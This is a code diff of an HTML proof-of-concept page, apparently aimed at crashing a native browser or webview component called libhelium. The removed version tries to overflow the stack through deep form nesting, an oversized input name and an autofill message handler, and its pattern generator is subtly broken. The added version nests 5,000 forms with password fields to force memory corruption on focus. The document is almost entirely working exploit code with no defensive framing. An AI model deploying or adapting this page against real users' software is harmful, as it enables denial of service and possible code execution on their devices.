@@ -1,46 +1,33 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>libhelium Native SIGSEGV PoC</title>
+</head>
 <body>
+    <div id="root"></div>
     <script>
-        // Generate a unique pattern to identify exactly where the overflow happens
-        function generatePattern(length) {
-            let res = "";
-            let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            for (let i = 0; i < length; i++) {
-                res += alphabet.charAt(Math.floor(Math.random() * alphabet.alphabet));
-            }
-            return res;
-        }
-
-        const payload = "A".repeat(1024) + "B".repeat(1024) + "C".repeat(1024); // Block fuzzer
-
-        function trigger() {
-            let root = document.createElement('div');
-            document.body.appendChild(root);
-            let current = root;
-
-            // 1. Nest to the edge of the stack limit (approx 1500-2000)
-            for (let i = 0; i < 1800; i++) {
+        function triggerMemoryCorruption() {
+            let current = document.getElementById('root');
+            
+            // Generate deep tree to force unbounded native C++ allocation
+            for (let i = 0; i < 5000; i++) {
                 let f = document.createElement('form');
+                let input1 = document.createElement('input');
+                input1.type = "text";
+                let input2 = document.createElement('input');
+                input2.type = "password";
+                f.appendChild(input1);
+                f.appendChild(input2);
                 current.appendChild(f);
                 current = f;
             }
-
-            // 2. The Twerk: Inject the overflow at the very bottom of the stack
-            // We use a massive 'name' attribute to try and reach the return address
-            let aceNode = document.createElement('input');
-            aceNode.setAttribute('name', generatePattern(4096)); 
-            aceNode.setAttribute('id', 'ACE_TARGET');
-            current.appendChild(aceNode);
-
-            // 3. Force the native C++ Autofill/Crawler to process this specific node
-            if (window._AutofillMessageHandler) {
-                window._AutofillMessageHandler.postMessage('{"action":"request_autofill"}');
-            }
-            aceNode.focus();
+            
+            // Trigger unbounded recursive tree walk in native layout engine
+            let deepInput = current.querySelector('input');
+            if(deepInput) deepInput.focus();
         }
-
-        setTimeout(trigger, 1000);
+        setTimeout(triggerMemoryCorruption, 500);
     </script>
 </body>
 </html>
